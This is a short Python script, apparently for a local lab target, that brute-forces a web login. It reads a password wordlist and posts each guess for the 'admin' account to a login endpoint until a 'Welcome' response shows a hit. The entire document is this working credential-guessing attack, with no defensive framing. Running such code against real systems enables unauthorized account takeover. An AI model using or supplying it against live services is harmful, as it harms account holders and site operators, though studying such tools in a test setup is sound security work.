import requests

def brute_force_login(url, username, wordlist):
    with open(wordlist, 'r') as f:
        passwords = f.read().splitlines()
        for password in passwords:
            data = {'username': username, 'password': password}
            response = requests.post(url, data=data)
            if "Welcome" in response.text:
                print(f"Password found: {password}")
                return
        print("Password not found in wordlist.")

url = "http://127.0.0.1:5000/login"
wordlist = "wordlists/common_passwords.txt"
brute_force_login(url, "admin", wordlist)
